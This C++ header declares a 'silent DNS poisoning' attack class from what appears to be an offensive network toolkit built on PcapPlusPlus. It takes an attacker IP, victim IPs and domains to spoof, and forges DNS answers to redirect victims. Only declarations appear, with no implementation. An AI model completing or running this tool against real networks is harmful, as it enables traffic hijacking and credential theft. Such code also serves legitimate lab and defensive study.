#pragma once

#include "DnsResourceData.h"
#include "IpAddress.h"
#include "PcapLiveDevice.h"
#include "dns_poisoning/dns_poisoning_strategy.h"
#include <memory>
#include <string>
#include <unordered_set>
#include <utility>

namespace std {
template <> struct hash<pcpp::IPv4Address> {
    size_t operator()(const pcpp::IPv4Address &addr) const noexcept {
        return std::hash<uint32_t>{}(addr.toInt());
    }
};
} // namespace std

namespace ATK::DNS {

/**
 * Silent DNS poisoning attack.
 *
 * Will respond to DNS queries from a target victim with forged answers for
 * specific or all domains, redirecting to a spoofed IP address.
 */
class SilentDnsPoisoningStrategy : public ATK::DNS::DnsPoisoningStrategy {
  public:
    class Builder {
      public:
        explicit Builder(pcpp::PcapLiveDevice *device) : device_(device) {}

        Builder &attackerIp(pcpp::IPv4Address attackerIp) {
            this->attackerIp_ = attackerIp;
            return *this;
        }

        Builder &victimIps(std::unordered_set<pcpp::IPv4Address> victimIps) {
            this->victimIps_ = std::move(victimIps);
            return *this;
        }

        Builder &domainsToSpoof(std::unordered_set<std::string> domains) {
            this->domainsToSpoof_ = std::move(domains);
            return *this;
        }

        std::unique_ptr<SilentDnsPoisoningStrategy> build() {
            return std::unique_ptr<SilentDnsPoisoningStrategy>(
                new SilentDnsPoisoningStrategy(this->device_, this->attackerIp_,
                                               this->victimIps_,
                                               this->domainsToSpoof_));
        }

      private:
        pcpp::PcapLiveDevice *device_;
        pcpp::IPv4Address attackerIp_;
        std::unordered_set<pcpp::IPv4Address> victimIps_;
        std::unordered_set<std::string> domainsToSpoof_; // empty = spoof all
    };

    void execute() override;

  private:
    SilentDnsPoisoningStrategy(pcpp::PcapLiveDevice *device,
                               pcpp::IPv4Address attackerIp,
                               std::unordered_set<pcpp::IPv4Address> victimIps,
                               std::unordered_set<std::string> domainsToSpoof)
        : device_(device), attackerIp_(std::move(attackerIp)),
          victimIps_(std::move(victimIps)),
          domainsToSpoof_(std::move(domainsToSpoof)) {
        if (device == nullptr) {
            throw std::invalid_argument("Not a valid interface");
        }
    }

    void onPacketArrives(pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device,
                         void *cookie) override;

    pcpp::PcapLiveDevice *device_;
    pcpp::IPv4Address attackerIp_;
    std::unordered_set<pcpp::IPv4Address> victimIps_;
    std::unordered_set<std::string> domainsToSpoof_;
};

} // namespace ATK::DNS
